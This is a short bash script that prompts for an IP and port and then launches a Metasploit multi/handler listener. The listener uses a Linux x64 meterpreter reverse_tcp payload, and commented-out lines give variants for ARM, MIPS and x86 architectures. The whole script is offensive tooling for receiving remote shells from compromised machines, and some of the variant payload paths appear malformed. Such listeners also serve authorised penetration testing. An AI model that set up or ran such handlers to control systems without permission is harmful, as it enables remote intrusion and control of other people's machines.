#!/bin/bash
clear
echo "************************************************************"
echo " Automatic Linux METTLE Listener - FOR METASPLOIT           "
echo " For aarch64/armle/mipsle/mipsbe/x64/x86                    " 
echo " Astr0Baby                                                  "
echo "************************************************************"
echo -e "What IP are we gonna listen to ?  \c"
read host
echo -e "What Port Number are we gonna listen to? : \c"
read port
echo "Starting the meterpreter listener.."
echo -n './msfconsole -x "use exploit/multi/handler;  set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ' > run.listener.sh 

# Here are all the current mettle/meterpreter paylods that can be used
# In order to use them just comment the above and uncomment one below

# echo -n './msfconsole -x "use exploit/multi/handler;  set PAYLOAD linux/payload/linux/aarch64/meterpreter/reverse_tcp  ; set LHOST ' > run.listener.sh
# echo -n './msfconsole -x "use exploit/multi/handler;  set PAYLOAD linux/payload/linux/armle/meterpreter/reverse_tcp  ; set LHOST ' > run.listener.sh
# echo -n './msfconsole -x "use exploit/multi/handler;  set PAYLOAD linux/payload/linux/mipsbe/meterpreter/reverse_tcp ; set LHOST ' > run.listener.sh
# echo -n './msfconsole -x "use exploit/multi/handler;  set PAYLOAD linux/payload/linux/mipsle/meterpreter/reverse_tcp ; set LHOST ' > run.listener.sh
# echo -n './msfconsole -x "use exploit/multi/handler;  set PAYLOAD linux/payload/linux/x64/meterpreter/reverse_tcp  ; set LHOST ' > run.listener.sh
# echo -n './msfconsole -x "use exploit/multi/handler;  set PAYLOAD linux/payload/linux/x86/meterpreter/reverse_tcp ; set LHOST ' > run.listener.sh

echo -n $host >> run.listener.sh 
echo -n '; set LPORT ' >> run.listener.sh 
echo -n $port >> run.listener.sh 
echo -n '; run"' >> run.listener.sh  
chmod +x run.listener.sh 
./run.listener.sh 

